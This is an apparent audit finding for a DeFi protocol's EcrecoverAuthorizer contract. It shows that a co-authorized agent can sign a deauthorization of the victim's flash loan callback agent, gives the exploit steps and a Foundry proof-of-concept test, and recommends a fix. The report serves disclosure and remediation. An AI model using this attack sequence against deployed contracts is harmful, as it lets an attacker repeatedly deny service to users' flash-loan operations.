### Title
Co-authorized agent can deauthorize victim's flash loan callback agent via EcrecoverAuthorizer - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that is already authorized by `authorization.authorizer`, not only from the authorizer themselves. This allows a co-authorized attacker to sign and submit a deauthorization of any other agent of the victim, including a flash loan callback contract, breaking atomic flash-loan-based operations.

### Finding Description
**Code path and root cause:**

In `EcrecoverAuthorizer.setIsAuthorized` (lines 33–36), the signer check is:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch permits any address that `authorization.authorizer` has previously authorized to sign an `Authorization` struct on the authorizer's behalf — including one with `isAuthorized = false` targeting a different agent. There is no restriction preventing a co-authorized agent from revoking another agent's authorization. [1](#0-0) 

The resulting call is:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

In `Midnight.setIsAuthorized`, `msg.sender` is the `EcrecoverAuthorizer` contract, and the check `isAuthorized[onBehalf][msg.sender]` passes as long as the victim has authorized the `EcrecoverAuthorizer` (which is a prerequisite for using it at all). [2](#0-1) 

**Exploit flow (preconditions → trigger → bad state):**

1. Victim calls `midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` — required to use the periphery contract.
2. Victim calls `midnight.setIsAuthorized(flashLoanAgent, true, victim)` — authorizes the flash loan callback contract.
3. Victim calls `midnight.setIsAuthorized(attacker, true, victim)` — authorizes the attacker for some other purpose (e.g., a router, aggregator, or co-signer contract).
4. Attacker constructs `Authorization { authorizer: victim, authorized: flashLoanAgent, isAuthorized: false, nonce: nonce[victim], deadline: future }` and signs it with the attacker's own key.
5. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
6. `signer = attacker`; check `isAuthorized[victim][attacker]` → `true` → passes.
7. `midnight.setIsAuthorized(flashLoanAgent, false, victim)` executes; `isAuthorized[victim][flashLoanAgent]` is set to `false`.
8. Any subsequent `flashLoan` call that routes through `flashLoanAgent` and requires `flashLoanAgent` to call `repay`, `take`, `withdraw`, or `withdrawCollateral` on behalf of victim will revert with `Unauthorized`. [3](#0-2) 

**Why existing checks fail:**

- The nonce check (`nonce[authorization.authorizer]++`) only prevents replay of the same authorization; it does not prevent a co-authorized agent from consuming a fresh nonce to submit a new deauthorization.
- The deadline check is trivially satisfied by the attacker choosing a future timestamp.
- There is no check that `signer != authorization.authorized` or that a co-authorized agent cannot modify the authorization of another agent. [4](#0-3) 

### Impact Explanation
Any victim who has authorized both a flash loan callback agent and any other address (attacker) via `EcrecoverAuthorizer` can have their flash loan callback agent silently deauthorized. All flash-loan-based atomic operations — `repay`, `take`, `withdraw`, `withdrawCollateral`, `liquidate` — that depend on the callback agent being authorized will revert with `Unauthorized` or `WrongFlashLoanCallbackReturnValue`. The attacker can repeat this every time the victim re-authorizes the agent, creating a persistent, low-cost DoS.

### Likelihood Explanation
The precondition — victim has authorized both the `EcrecoverAuthorizer` and a second address (attacker) — is realistic. Any user who uses the `EcrecoverAuthorizer` periphery and has also authorized a router, aggregator, keeper, or any other contract is vulnerable. The attacker only needs to read the public `nonce` mapping and submit one transaction. The attack is repeatable at negligible cost each time the victim re-authorizes the flash loan agent.

### Recommendation
Remove the co-authorized-agent branch from the signer check in `EcrecoverAuthorizer.setIsAuthorized`. Only the `authorization.authorizer` themselves should be permitted to sign authorization changes via this periphery contract:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

This preserves the EIP-712 signature-delegation purpose of the contract (allowing the authorizer to pre-sign and have anyone submit) while eliminating the ability of co-authorized agents to modify the authorization mapping. [1](#0-0) 

### Proof of Concept
```solidity
// Foundry unit test
function testCoAuthorizedAgentDeauthorizesFlashLoanAgent() public {
    address victim = makeAddr("victim");
    address flashLoanAgent = makeAddr("flashLoanAgent");
    address attacker = makeAddr("attacker");
    (attacker, privateKey[attacker]) = makeAddrAndKey("attacker");

    // Victim authorizes EcrecoverAuthorizer, flashLoanAgent, and attacker
    vm.startPrank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    midnight.setIsAuthorized(flashLoanAgent, true, victim);
    midnight.setIsAuthorized(attacker, true, victim);
    vm.stopPrank();

    assertEq(midnight.isAuthorized(victim, flashLoanAgent), true);

    // Attacker constructs and signs a deauthorization of flashLoanAgent
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: flashLoanAgent,
        isAuthorized: false,
        nonce: ecrecoverAuthorizer.nonce(victim), // = 0
        deadline: block.timestamp + 1 days
    });
    Signature memory sig = signAuthorization(auth, attacker); // attacker signs

    // Attacker submits — no victim involvement
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assert: flashLoanAgent is now deauthorized
    assertEq(midnight.isAuthorized(victim, flashLoanAgent), false);

    // Assert: any flashLoan callback that calls repay/take on behalf of victim reverts
    // (deploy a minimal IFlashLoanCallback that calls midnight.repay(... onBehalf=victim ...))
    // vm.expectRevert(IMidnight.Unauthorized.selector);
    // midnight.flashLoan(..., flashLoanAgent, ...);
}
```

Expected assertions: `isAuthorized(victim, flashLoanAgent)` transitions from `true` to `false` after the attacker's single transaction; subsequent flash loan callbacks acting on behalf of victim revert with `Unauthorized`.
